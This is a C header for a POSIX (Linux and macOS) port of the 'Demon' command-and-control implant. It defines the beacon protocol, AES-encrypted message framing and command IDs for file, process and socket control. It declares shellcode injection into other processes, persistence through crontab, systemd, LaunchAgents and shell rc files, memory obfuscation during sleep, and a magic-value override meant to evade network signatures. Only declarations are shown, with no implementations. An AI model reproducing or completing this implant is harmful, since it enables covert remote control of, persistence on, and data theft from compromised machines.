/*
 * DemonPosix.h — Master instance header for the POSIX Demon agent
 * Targets: Linux (x64/arm64) and macOS (x64/arm64)
 *
 * Mirrors the structure of the Windows Demon agent but uses POSIX/BSD APIs
 * instead of Win32. The C2 protocol (binary format, AES-256, magic value,
 * command IDs) is identical so the same teamserver handles both agents.
 */

#ifndef DEMON_POSIX_H
#define DEMON_POSIX_H

/* ── Feature test macros — must come before any system headers ───────── */
#ifdef __APPLE__
/* macOS: _DARWIN_C_SOURCE exposes BSD types (u_int, u_short, u_long, u_char)
 * that are used by system headers like sys/proc_info.h, net/route.h etc.
 * Without this, clang in default C mode hides these POSIX extensions. */
#  ifndef _DARWIN_C_SOURCE
#    define _DARWIN_C_SOURCE
#  endif
#else
/* Linux */
#  ifndef _GNU_SOURCE
#    define _GNU_SOURCE   /* popen, pclose, strdup, strndup, asprintf, etc. */
#  endif
#  ifndef _POSIX_C_SOURCE
#    define _POSIX_C_SOURCE 200809L
#  endif
#  ifndef _DEFAULT_SOURCE
#    define _DEFAULT_SOURCE
#  endif
#endif

/* ── Standard POSIX headers ─────────────────────────────────────────── */
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include <ifaddrs.h>

/* ── Platform detection ──────────────────────────────────────────────── */
#ifdef __APPLE__
#  include <mach/mach.h>
#  include <mach-o/dyld.h>
#  include <sys/proc_info.h>
#  include <libproc.h>
#  define OS_PLATFORM_MACOS   1
#  define OS_PLATFORM_LINUX   0
#else
#  include <sys/ptrace.h>
#  include <sys/wait.h>
#  include <sys/prctl.h>
#  include <linux/limits.h>
#  define OS_PLATFORM_MACOS   0
#  define OS_PLATFORM_LINUX   1
#endif

/* ── C2 protocol constants (must match Windows Demon + teamserver) ───── */
/* Magic value: override at compile time with -DCONFIG_MAGIC=0x... to
 * avoid the well-known 0xDEADBEEF signature in network traffic. */
#ifdef CONFIG_MAGIC
#  define DEMON_MAGIC_VALUE  CONFIG_MAGIC
#else
#  define DEMON_MAGIC_VALUE  0xDEADBEEF
#endif

/* OS type flags sent during registration so the teamserver knows the OS */
#define DEMON_OS_WINDOWS            0x01
#define DEMON_OS_LINUX              0x02
#define DEMON_OS_MACOS              0x03

/* Command IDs — identical to commands.go */
#define COMMAND_GET_JOB             1    /* periodic beacon: request pending jobs */
#define COMMAND_SLEEP               11
#define COMMAND_CHECKIN             99   /* = DEMON_INIT: initial registration only */
#define COMMAND_FS                  15
#define COMMAND_PROC                0x1010  /* process module — matches teamserver */
#define COMMAND_PROC_LIST           12      /* list processes */
#define COMMAND_OUTPUT              100
#define COMMAND_SCREENSHOT          2510
#define COMMAND_PIVOT               2520
#define COMMAND_SOCKET              2540
#define COMMAND_EXIT                92
#define BEACON_OUTPUT               94
#define COMMAND_TOKEN               40
#define COMMAND_CHECKIN_             100  /* alias, avoid redef */

/* FS sub-commands */
#define DEMON_COMMAND_FS_DIR        1
#define DEMON_COMMAND_FS_DOWNLOAD   2
#define DEMON_COMMAND_FS_UPLOAD     3
#define DEMON_COMMAND_FS_CD         4
#define DEMON_COMMAND_FS_REMOVE     5
#define DEMON_COMMAND_FS_MKDIR      6
#define DEMON_COMMAND_FS_CP         7
#define DEMON_COMMAND_FS_MV         8
#define DEMON_COMMAND_FS_PWD        9
#define DEMON_COMMAND_FS_CAT        10

/* Process sub-commands */
#define DEMON_COMMAND_PROC_LIST     1
#define DEMON_COMMAND_PROC_MODULES  2
#define DEMON_COMMAND_PROC_GREP     3
#define DEMON_COMMAND_PROC_CREATE   4
#define DEMON_COMMAND_PROC_MEMORY   6
#define DEMON_COMMAND_PROC_KILL     7

/* Socket sub-commands */
#define DEMON_COMMAND_SOCKET_SOCKS5_ADD    1
#define DEMON_COMMAND_SOCKET_SOCKS5_LIST   2
#define DEMON_COMMAND_SOCKET_SOCKS5_REMOVE 3
#define DEMON_COMMAND_SOCKET_RPORTFWD_ADD  4
#define DEMON_COMMAND_SOCKET_RPORTFWD_LIST 5
#define DEMON_COMMAND_RPORTFWD_REMOVE      6

/* Architecture constants (same as Windows Demon) */
#define PROCESS_ARCH_UNKNOWN        0
#define PROCESS_ARCH_X64            1
#define PROCESS_ARCH_X86            2
#define PROCESS_ARCH_IA64           3
#define PROCESS_ARCH_ARM64          9

/* Limits */
#define DEMON_MAX_RESPONSE_LENGTH   0x1e00000   /* 30 MB */
#define DEMON_MAX_PACKAGE_SIZE      0x200000    /* 2 MB per chunk */
#define DEMON_PIPE_BUFFER_SIZE      0x10000

/* ── AES-256 CBC key/IV sizes ────────────────────────────────────────── */
#define AES_KEY_SIZE    32
#define AES_IV_SIZE     16
#define AES_BLOCK_SIZE  16

/* ── Package/parser constants ────────────────────────────────────────── */
#define PKG_TYPE_INT32   0x01
#define PKG_TYPE_INT64   0x02
#define PKG_TYPE_BYTES   0x03
#define PKG_TYPE_STRING  0x04

/* ── Transport types ─────────────────────────────────────────────────── */
#define TRANSPORT_HTTP   1
#define TRANSPORT_HTTPS  2
#define TRANSPORT_SOCKET 3  /* UNIX domain socket pivot */

/* ── Persistence methods ─────────────────────────────────────────────── */
#define PERSIST_NONE      0
#define PERSIST_CRON      1   /* Linux: crontab */
#define PERSIST_SYSTEMD   2   /* Linux: ~/.config/systemd/user */
#define PERSIST_LAUNCHD   3   /* macOS: ~/Library/LaunchAgents */
#define PERSIST_BASHRC    4   /* Both: ~/.bashrc / ~/.zshrc */

/* ── Forward declarations ────────────────────────────────────────────── */
typedef struct _INSTANCE     INSTANCE;
typedef struct _PKG_BUFFER   PKG_BUFFER;
typedef struct _PARSER       PARSER;
typedef struct _TRANSPORT    TRANSPORT;
typedef struct _PIVOT_LINK   PIVOT_LINK;

/* ── Binary package buffer ───────────────────────────────────────────── */
typedef struct _PKG_BUFFER {
    uint8_t  *Buffer;
    size_t    Length;
    size_t    Capacity;
} PKG_BUFFER;

/* ── Binary parser ───────────────────────────────────────────────────── */
typedef struct _PARSER {
    uint8_t  *Original;
    uint8_t  *Buffer;
    size_t    Length;
} PARSER;

/* ── HTTP transport config ───────────────────────────────────────────── */
typedef struct _HTTP_CONFIG {
    char     *Host;
    uint16_t  Port;
    char     *Uri;
    bool      Ssl;
    char     *UserAgent;
    char    **Headers;        /* NULL-terminated array of "Key: Value" */
    size_t    HeaderCount;
    char     *ProxyUrl;
} HTTP_CONFIG;

/* ── UNIX socket pivot transport ─────────────────────────────────────── */
typedef struct _PIVOT_LINK {
    int       SockFd;
    uint32_t  AgentID;
    pthread_t Thread;
    bool      Active;
    struct _PIVOT_LINK *Next;
} PIVOT_LINK;

/* ── Master transport wrapper ────────────────────────────────────────── */
typedef struct _TRANSPORT {
    int          Type;           /* TRANSPORT_HTTP / TRANSPORT_HTTPS / TRANSPORT_SOCKET */
    HTTP_CONFIG  Http;
    int          PivotSock;      /* fd of UNIX socket used as pivot channel */
    bool         IsPivot;        /* running as a pivot child */
    PIVOT_LINK  *Links;          /* child pivot links (parent side) */
} TRANSPORT;

/* ── Per-agent encryption keys ───────────────────────────────────────── */
typedef struct _ENCRYPTION {
    uint8_t  AesKey[AES_KEY_SIZE];
    uint8_t  AesIv[AES_IV_SIZE];
} ENCRYPTION;

/* ── Config / session info ───────────────────────────────────────────── */
typedef struct _SESSION {
    uint32_t    AgentID;
    char        Hostname[256];
    char        Username[256];
    char        Domain[256];
    char        InternalIP[64];
    char        ProcessName[256];
    char        ProcessPath[4096];
    uint32_t    ProcessPID;
    uint32_t    ProcessPPID;
    uint32_t    ProcessArch;
    bool        Elevated;        /* effective uid == 0 */
    uintptr_t   BaseAddress;

    /* OS info */
    uint32_t    OsMajor;
    uint32_t    OsMinor;
    uint32_t    OsPatch;
    uint32_t    OsType;          /* DEMON_OS_LINUX / DEMON_OS_MACOS */
    uint32_t    OsArch;

    /* Timing */
    uint32_t    SleepDelay;      /* seconds */
    uint32_t    SleepJitter;     /* percentage 0-100 */
    int64_t     KillDate;        /* unix timestamp, 0 = never */
    int32_t     WorkingHours;    /* packed: hi16=end, lo16=start in minutes */
} SESSION;

/* ── Background job entry ────────────────────────────────────────────── */
typedef struct _JOB {
    uint32_t      CommandID;
    uint32_t      RequestID;
    pthread_t     Thread;
    volatile bool Running;
    struct _JOB  *Next;
} JOB;

/* ── Master instance struct ──────────────────────────────────────────── */
typedef struct _INSTANCE {
    SESSION     Session;
    TRANSPORT   Transport;
    ENCRYPTION  Encryption;

    /* Job management */
    JOB        *Jobs;
    pthread_mutex_t JobsMtx;

    /* Kill switch */
    volatile bool   ShouldExit;

    /* Config flags */
    bool         ObfSleep;      /* obfuscate memory during sleep */
} INSTANCE;

/* ── Global instance ─────────────────────────────────────────────────── */
extern INSTANCE *DemonInstance;

/* ── Function prototypes — Runtime ──────────────────────────────────── */
void  RuntimeInit(void);
void  RuntimeLoop(void);
uint32_t  GenerateAgentID(void);
bool  IsKillDatePassed(void);
bool  IsWorkingHours(void);
void  DoSleep(uint32_t seconds, uint32_t jitter_pct);
void  ObfuscatedSleep(uint32_t seconds, uint32_t jitter_pct);

/* ── Function prototypes — Package / Parser ─────────────────────────── */
PKG_BUFFER *PkgCreate(uint32_t commandID, uint32_t requestID);
void        PkgAddInt32(PKG_BUFFER *pkg, int32_t val);
void        PkgAddInt64(PKG_BUFFER *pkg, int64_t val);
void        PkgAddBytes(PKG_BUFFER *pkg, const uint8_t *data, uint32_t len);
void        PkgAddString(PKG_BUFFER *pkg, const char *str);
uint8_t    *PkgFinalize(PKG_BUFFER *pkg, size_t *out_len);
void        PkgFree(PKG_BUFFER *pkg);

/* Build the full framed message: [SIZE][MAGIC][AGENTID][payload...] */
uint8_t    *PkgBuildMessage(PKG_BUFFER *pkg, const uint8_t *aes_key,
                            const uint8_t *aes_iv, size_t *out_len);

PARSER     *ParserNew(const uint8_t *data, size_t len);
void        ParserFree(PARSER *p);
int32_t     ParserReadInt32(PARSER *p);
int64_t     ParserReadInt64(PARSER *p);
uint8_t    *ParserReadBytes(PARSER *p, uint32_t *out_len);
char       *ParserReadString(PARSER *p);
bool        ParserDecrypt(PARSER *p, const uint8_t *key, const uint8_t *iv);

/* ── Function prototypes — AES-256 CBC ──────────────────────────────── */
int  AES256_Encrypt(const uint8_t *in,  size_t in_len,
                    uint8_t       *out, size_t *out_len,
                    const uint8_t *key, const uint8_t *iv);
int  AES256_Decrypt(const uint8_t *in,  size_t in_len,
                    uint8_t       *out, size_t *out_len,
                    const uint8_t *key, const uint8_t *iv);

/* ── Function prototypes — Transport ────────────────────────────────── */
int    TransportSendRecv(const uint8_t *request, size_t req_len,
                         uint8_t **response, size_t *resp_len);
int    TransportHttpInit(void);
void   TransportHttpCleanup(void);

/* ── Function prototypes — Commands ─────────────────────────────────── */
void  CommandDispatcher(uint32_t cmdID, uint32_t reqID,
                        PARSER *parser);
void  CmdSleep(uint32_t reqID, PARSER *p);
void  CmdExit(uint32_t reqID, PARSER *p);
void  CmdFs(uint32_t reqID, PARSER *p);
void  CmdProc(uint32_t reqID, PARSER *p);
void  CmdSocket(uint32_t reqID, PARSER *p);
void  CmdOutput(uint32_t reqID, const char *text);

/* ── Function prototypes — Registration ─────────────────────────────── */
uint8_t *BuildRegisterPacket(size_t *out_len);
void     CollectSessionInfo(void);

/* ── Function prototypes — Injection ────────────────────────────────── */
bool  InjectShellcode(uint32_t pid, const uint8_t *sc, size_t sc_len);

/* ── Function prototypes — Persistence ─────────────────────────────── */
bool  PersistInstall(int method, const char *name);
bool  PersistRemove(int method, const char *name);

/* ── Function prototypes — Pivot ─────────────────────────────────────── */
bool  PivotConnect(const char *socket_path);
void  PivotDisconnect(void);
int   PivotSendRecv(const uint8_t *data, size_t len,
                    uint8_t **resp, size_t *resp_len);

/* ── Utility macros ──────────────────────────────────────────────────── */
#define DEMON_ZERO(ptr, sz)  memset((ptr), 0, (sz))

#ifdef DEBUG
#  define DEMON_LOG(fmt, ...) \
       fprintf(stderr, "[DEMON] " fmt "\n", ##__VA_ARGS__)
#else
#  define DEMON_LOG(fmt, ...)  do { } while (0)
#endif

#endif /* DEMON_POSIX_H */
